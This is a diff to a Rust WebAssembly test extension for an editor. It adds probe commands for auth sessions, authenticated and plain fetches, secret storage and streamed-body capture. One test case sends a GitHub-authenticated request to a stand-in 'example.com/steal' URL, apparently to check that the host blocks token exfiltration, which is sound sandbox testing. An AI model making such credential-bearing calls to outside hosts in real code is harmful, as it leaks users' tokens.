@@ -17,9 +17,15 @@ use codeyard::api::responses::Response;
 thread_local! {
     /// Which request each outstanding ticket answers.
     static WAITING: RefCell<HashMap<Ticket, u64>> = RefCell::new(HashMap::new());
+    /// Streamed bodies (`data` events) per ticket, so an answer can show what arrived.
+    static BODIES: RefCell<HashMap<Ticket, Vec<u8>>> = RefCell::new(HashMap::new());
 }
 
 struct Probe;
+
+fn get(url: &str) -> HttpRequest {
+    HttpRequest { method: "GET".into(), url: url.into(), headers: vec![], body: vec![], timeout_ms: None }
+}
 
 fn reply(id: u64, json: String) {
     requests::respond(id, Ok(&Response::Json(json)));
@@ -39,6 +45,7 @@ fn describe(c: &Completion) -> String {
         Completion::Text(t) => format!("text {t:?}"),
         Completion::Document(Some(d)) => format!("document {} {}", d.language, d.text.len()),
         Completion::Document(None) => "no document".into(),
+        Completion::Account(a) => format!("account {} {}", a.provider, a.label),
         other => format!("{other:?}"),
     }
 }
@@ -133,6 +140,14 @@ impl Guest for Probe {
                 wait(window::input_box(&options), id)
             }
             "doc" => wait(documents::active(), id),
+            "auth" => wait(codeyard::api::auth::session("github", &[]), id),
+            "auth-acme" => wait(codeyard::api::auth::session("acme", &[]), id),
+            "authfetch" => wait(codeyard::api::auth::fetch("github", &get("https://api.github.com/user/repos")), id),
+            "authfetch-other" => wait(codeyard::api::auth::fetch("github", &get("https://api.example.com/steal")), id),
+            "authfetch-acme" => wait(codeyard::api::auth::fetch("acme", &get("https://api.acme.example.com/deployments")), id),
+            "netfetch" => wait(codeyard::api::net::fetch(&get("https://api.example.com/status")), id),
+            "secret-set" => wait(codeyard::api::secrets::set("api-key", "s3cr3t"), id),
+            "secret-get" => wait(codeyard::api::secrets::get("api-key"), id),
             "every" => reply(id, format!("{}", timers::every(30))),
             // What an extension can try from inside Wasm: WASI files, sockets and processes. Every line must fail.
             // Only in probe-escape.wasm: its socket imports would fail the package import check, by design.
@@ -158,12 +173,20 @@ impl Guest for Probe {
     }
 
     fn complete(ticket: Ticket, result: Completion) {
+        let body = BODIES.with(|b| b.borrow_mut().remove(&ticket));
         if let Some(id) = WAITING.with(|w| w.borrow_mut().remove(&ticket)) {
-            reply(id, describe(&result));
+            match body {
+                Some(b) => reply(id, format!("{} body {}", describe(&result), String::from_utf8_lossy(&b))),
+                None => reply(id, describe(&result)),
+            }
         }
     }
 
-    fn event(_ticket: Ticket, _event: StreamEvent) {}
+    fn event(ticket: Ticket, event: StreamEvent) {
+        if let StreamEvent::Data(d) = event {
+            BODIES.with(|b| b.borrow_mut().entry(ticket).or_default().extend_from_slice(&d));
+        }
+    }
 }
 
 export!(Probe);
